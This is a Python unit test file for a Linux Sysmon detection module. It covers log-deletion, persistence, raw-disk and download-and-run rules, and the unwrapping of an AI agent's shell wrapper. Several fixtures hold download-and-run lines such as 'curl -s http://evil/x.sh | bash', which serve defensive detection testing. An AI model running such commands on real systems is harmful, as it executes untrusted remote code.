import unittest
import os
import tempfile
from datetime import datetime, timezone

from jarvis import sysmon_linux
from jarvis.store import Store


class SysmonHealthTests(unittest.TestCase):
    def test_xml_retains_journal_time_separately_from_lagging_payload_time(self):
        text = """<Event><System><EventID>1</EventID>
        <TimeCreated SystemTime="2026-09-04T12:07:02.426568000Z"/>
        </System><EventData>
        <Data Name="UtcTime">2026-09-04 11:17:40.544</Data>
        <Data Name="Image">/usr/bin/example</Data>
        </EventData></Event>"""

        event = sysmon_linux._parse(text)[0]

        self.assertEqual(event["SystemTime"],
                         "2026-09-04T12:07:02.426568000Z")
        expected = datetime(2026, 9, 4, 12, 7, 2, 426568,
                            tzinfo=timezone.utc).timestamp()
        self.assertAlmostEqual(sysmon_linux._event_utc(event), expected,
                               places=5)

    def test_gap_detection_uses_journal_time_not_lagging_payload_time(self):
        since = datetime(2026, 9, 4, 12, 0, tzinfo=timezone.utc).timestamp()
        event = {
            "id": 1,
            "SystemTime": "2026-09-04T12:10:01.000000000Z",
            "UtcTime": "2026-09-04 11:17:40.544",
        }

        findings = sysmon_linux._health([event], since, incremental=True)

        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["title"],
                         "Sysmon journal rotated past the last read position")

    def test_text_record_payload_time_remains_a_supported_fallback(self):
        event = {"UtcTime": "2026-09-04 12:07:02.426568"}
        expected = datetime(2026, 9, 4, 12, 7, 2, 426568,
                            tzinfo=timezone.utc).timestamp()

        self.assertEqual(sysmon_linux._event_utc(event), expected)


class SysmonRawAccessTests(unittest.TestCase):
    def test_unresolved_devices_remain_visible_without_claiming_disk_reads(self):
        for device in ('c', '-', '', '<unknown>', '/', 'relative-device'):
            with self.subTest(device=device):
                out = sysmon_linux._rules([{'id':9, 'Image':'/usr/bin/tee',
                                            'Device':device}])
                self.assertEqual(out[0]['severity'], 'medium')
                self.assertEqual(out[0]['title'], sysmon_linux.RAW_UNRESOLVED_TITLE)
                self.assertIn('not established', out[0]['detail'])

    def test_real_device_path_is_high_even_for_tee(self):
        for image in ('/usr/bin/tee', '/usr/bin/dd', '/tmp/tee'):
            for device in ('/dev/sda', '/dev/nvme0n1', '/dev/mapper/root', '/tmp/disk-node'):
                with self.subTest(image=image, device=device):
                    out = sysmon_linux._rules([{'id':9, 'Image':image, 'Device':device}])
                    self.assertEqual(out[0]['severity'], 'high')
                    self.assertIn('read/write direction', out[0]['detail'])

    def test_process_context_requires_guid_not_reused_pid(self):
        create = {'id':1, 'Image':'/usr/bin/tee', 'ProcessId':'698',
                  'ProcessGuid':'{process-a}', 'CommandLine':'tee -a /home/u/keepalive.log'}
        event = {'id':9, 'Image':'/usr/bin/tee', 'ProcessId':'698',
                 'ProcessGuid':'{process-a}', 'Device':'c'}
        self.assertIn(create['CommandLine'], sysmon_linux._rules([create,event])[0]['detail'])
        event['ProcessGuid'] = '{process-b}'
        self.assertNotIn(create['CommandLine'], sysmon_linux._rules([create,event])[0]['detail'])

    def test_legacy_unresolved_hit_is_reclassified_without_refreshing_its_age(self):
        with tempfile.TemporaryDirectory() as directory:
            store = Store(os.path.join(directory, 'jarvis.db'))
            ts = sysmon_linux.now() - 600
            store.db.execute('''INSERT INTO sysmon_hits
                (ts,category,severity,title,detail,where_) VALUES(?,?,?,?,?,?)''',
                (ts, 'sysmon-linux', 'high', sysmon_linux.RAW_ACCESS_TITLE,
                 'tee opened c' + sysmon_linux.RAW_LEGACY_SUFFIX, sysmon_linux.CHANNEL))
            store.commit()
            out = sysmon_linux._remember(store, [], 24)
            self.assertEqual(len(out), 1)
            self.assertEqual(out[0]['severity'], 'medium')
            self.assertEqual(store.db.execute('SELECT ts FROM sysmon_hits').fetchone()[0], ts)
            store.close()

    def test_legacy_real_device_is_not_cleared(self):
        with tempfile.TemporaryDirectory() as directory:
            store = Store(os.path.join(directory, 'jarvis.db'))
            store.db.execute('''INSERT INTO sysmon_hits
                (ts,category,severity,title,detail,where_) VALUES(?,?,?,?,?,?)''',
                (sysmon_linux.now(), 'sysmon-linux', 'high', sysmon_linux.RAW_ACCESS_TITLE,
                 'tee opened /dev/sda' + sysmon_linux.RAW_LEGACY_SUFFIX, sysmon_linux.CHANNEL))
            store.commit()
            out = sysmon_linux._remember(store, [], 24)
            self.assertEqual(out[0]['severity'], 'high')
            store.close()


class SysmonLogDeletionTests(unittest.TestCase):
    def test_journald_rotating_its_archived_segment_is_not_an_alert(self):
        event = {
            "id": 23,
            "Image": "/usr/lib/systemd/systemd-journald",
            "TargetFilename": (
                "/var/log/journal/be5aebaf1e26404686aac5ad4351c165/"
                "system@3b914056b83f4ad68ebbd0efbc94388f-"
                "000000000025aa14-00065aa6c60e8085.journal"),
        }

        self.assertEqual(sysmon_linux._rules([event]), [])

    def test_shell_deleting_the_same_journal_segment_stays_high(self):
        event = {
            "id": 23,
            "Image": "/usr/bin/bash",
            "TargetFilename": "/var/log/journal/machine/system@1-2.journal",
        }

        findings = sysmon_linux._rules([event])

        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["severity"], "high")
        self.assertEqual(findings[0]["title"], sysmon_linux.LOG_DELETE_TITLE)

    def test_journald_deleting_an_unowned_log_stays_high(self):
        event = {
            "id": 26,
            "Image": "/usr/lib/systemd/systemd-journald",
            "TargetFilename": "/var/log/auth.log",
        }

        findings = sysmon_linux._rules([event])

        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["severity"], "high")

    def test_remember_forgets_a_preexisting_rotation_alert(self):
        with tempfile.TemporaryDirectory() as directory:
            store = Store(os.path.join(directory, "jarvis.db"))
            detail = (
                "systemd-journald deleted /var/log/journal/machine/"
                "system@1-2.journal — indicator removal")
            store.db.execute(
                """INSERT INTO sysmon_hits
                   (ts,category,severity,title,detail,where_)
                   VALUES(?,?,?,?,?,?)""",
                (int(datetime.now(timezone.utc).timestamp()), "sysmon-linux",
                 "high", sysmon_linux.LOG_DELETE_TITLE, detail,
                 sysmon_linux.CHANNEL))
            store.commit()

            self.assertEqual(sysmon_linux._remember(store, [], 24), [])
            count = store.db.execute(
                "SELECT COUNT(*) FROM sysmon_hits").fetchone()[0]
            self.assertEqual(count, 0)
            store.close()

    def test_compressor_removing_a_numbered_generation_is_not_an_alert(self):
        for target in ("/var/log/dmesg.0", "/var/log/syslog.7.gz",
                       "/var/log/apt/history.log.3.xz"):
            event = {"id": 23, "Image": "/usr/bin/gzip",
                     "TargetFilename": target}
            self.assertEqual(sysmon_linux._rules([event]), [], target)

    def test_deleting_a_live_log_by_name_stays_high(self):
        # No numbered generation: destruction, not rotation.
        event = {"id": 23, "Image": "/usr/bin/gzip",
                 "TargetFilename": "/var/log/auth.log"}
        findings = sysmon_linux._rules([event])
        self.assertEqual(findings[0]["severity"], "high")

    def test_rm_of_a_rotated_log_stays_high(self):
        # rm is not a rotation tool — a compressor packs and removes, rm only
        # removes.
        event = {"id": 26, "Image": "/usr/bin/rm",
                 "TargetFilename": "/var/log/dmesg.0"}
        findings = sysmon_linux._rules([event])
        self.assertEqual(findings[0]["severity"], "high")


class SysmonPersistenceTests(unittest.TestCase):
    def test_snapd_rewriting_its_own_mount_unit_is_not_an_alert(self):
        for target in (
                "/etc/systemd/system/snap-terraform-928.mount",
                "/etc/systemd/system/snap-terraform-928.mount.3Qwhl8fbp9hk~"):
            event = {"id": 11, "Image": "/usr/lib/snapd/snapd",
                     "TargetFilename": target}
            self.assertEqual(sysmon_linux._rules([event]), [], target)

    def test_snapd_writing_a_non_snap_unit_stays_high(self):
        event = {"id": 11, "Image": "/usr/lib/snapd/snapd",
                 "TargetFilename": "/etc/systemd/system/evil.service"}
        findings = sysmon_linux._rules([event])
        self.assertEqual(findings[0]["severity"], "high")
        self.assertEqual(findings[0]["title"], sysmon_linux.PERSIST_WRITE_TITLE)

    def test_another_writer_touching_a_snap_unit_name_stays_high(self):
        event = {"id": 11, "Image": "/usr/bin/bash",
                 "TargetFilename":
                     "/etc/systemd/system/snap-terraform-928.mount"}
        findings = sysmon_linux._rules([event])
        self.assertEqual(findings[0]["severity"], "high")

    def test_remember_forgets_a_preexisting_snapd_persistence_alert(self):
        with tempfile.TemporaryDirectory() as directory:
            store = Store(os.path.join(directory, "jarvis.db"))
            detail = ("snapd created/modified /etc/systemd/system/"
                      "snap-terraform-928.mount.3Qwhl8fbp9hk~")
            store.db.execute(
                """INSERT INTO sysmon_hits
                   (ts,category,severity,title,detail,where_)
                   VALUES(?,?,?,?,?,?)""",
                (int(datetime.now(timezone.utc).timestamp()), "sysmon-linux",
                 "high", sysmon_linux.PERSIST_WRITE_TITLE, detail,
                 sysmon_linux.CHANNEL))
            store.commit()

            self.assertEqual(sysmon_linux._remember(store, [], 24), [])
            count = store.db.execute(
                "SELECT COUNT(*) FROM sysmon_hits").fetchone()[0]
            self.assertEqual(count, 0)
            store.close()


class SysmonTableIsolationTests(unittest.TestCase):
    def test_windows_sysmon_does_not_re_emit_linux_rows(self):
        from jarvis import sysmon
        with tempfile.TemporaryDirectory() as directory:
            store = Store(os.path.join(directory, "jarvis.db"))
            store.db.execute(
                """INSERT INTO sysmon_hits
                   (ts,category,severity,title,detail,where_)
                   VALUES(?,?,?,?,?,?)""",
                (int(datetime.now(timezone.utc).timestamp()), "sysmon-linux",
                 "high", sysmon_linux.LOG_DELETE_TITLE,
                 "gzip deleted /var/log/x — indicator removal",
                 sysmon_linux.CHANNEL))
            store.commit()

            out = sysmon._remember(store, [], 24)
            self.assertEqual(
                [f for f in out if f["category"] == "sysmon-linux"], [])
            store.close()


if __name__ == "__main__":
    unittest.main()


class HarnessUnwrapTests(unittest.TestCase):
    """The agent harness's own scaffolding must never be read as the command.

    Measured on a live journal before the fix: 9 of 26 harness-wrapped events
    failed to unwrap and were content-matched raw, which is how a routine
    `cat` produced a HIGH "download-and-run in a command line" alert.
    """

    SNAP = ("/bin/bash -c source /home/u/.claude/shell-snapshots/snap-1.sh "
            "2>/dev/null || true && shopt -u extglob 2>/dev/null || true && "
            "{{ \\builtin unalias -- 'x'; \\builtin unset -f -- 'x'; }} "
            ">/dev/null 2>&1 || true && eval '{real}'")

    def _wrap(self, real, terminator):
        return self.SNAP.format(real=real) + terminator

    def test_single_line_shape_ends_at_dev_null(self):
        cmd = self._wrap("cat /tmp/out.txt",
                         " < /dev/null && pwd -P >| /tmp/claude-1-cwd")
        self.assertEqual(sysmon_linux._payload(cmd), "cat /tmp/out.txt")

    def test_multi_line_shape_has_no_dev_null_and_still_unwraps(self):
        cmd = self._wrap("python3 - <<'PY'\nprint(1)\nPY",
                         " && pwd -P >| /tmp/claude-2-cwd")
        self.assertEqual(sysmon_linux._payload(cmd),
                         "python3 - <<'PY'\nprint(1)\nPY")

    def test_a_truncated_wrapper_still_yields_the_command_not_the_scaffolding(self):
        cmd = self.SNAP.format(real="curl http://x/a.sh | sh")   # no terminator
        payload = sysmon_linux._payload(cmd)
        self.assertNotIn("shell-snapshots", payload)
        self.assertNotIn("builtin unalias", payload)
        self.assertIn("curl http://x/a.sh | sh", payload)

    def test_scaffolding_alone_never_trips_the_download_rule(self):
        cmd = self._wrap("cat /tmp/out.txt",
                         " < /dev/null && pwd -P >| /tmp/claude-3-cwd")
        self.assertFalse(sysmon_linux.DOWNLOAD_RUN.search(
            sysmon_linux._payload(cmd)))

    def test_a_real_payload_inside_the_wrapper_is_still_caught(self):
        cmd = self._wrap("curl -s http://evil/x.sh | bash",
                         " < /dev/null && pwd -P >| /tmp/claude-4-cwd")
        self.assertTrue(sysmon_linux.DOWNLOAD_RUN.search(
            sysmon_linux._payload(cmd)))

    def test_a_non_harness_command_line_is_returned_untouched(self):
        cmd = "/usr/bin/curl -s http://example/x.sh | sh"
        self.assertEqual(sysmon_linux._payload(cmd), cmd)

    def test_bash_apostrophe_escaping_is_undone(self):
        cmd = self._wrap("echo it" + sysmon_linux._SQ_ESCAPE + "s fine",
                         " < /dev/null")
        self.assertEqual(sysmon_linux._payload(cmd), "echo it's fine")


class GoBuildTest(unittest.TestCase):
    def test_go_test_binary_is_dev_not_high(self):
        img = '/tmp/tmp/go-build392567114/b216/routing.test'
        out = sysmon_linux._rules([{'id': 1, 'Image': img,
                                    'CommandLine': img + ' -test.paniconexit0'}])
        self.assertEqual([f['severity'] for f in out], ['medium'])

    def test_plain_tmp_binary_stays_high(self):
        out = sysmon_linux._rules([{'id': 1, 'Image': '/tmp/b216/routing.test'}])
        self.assertEqual([f['severity'] for f in out], ['high'])
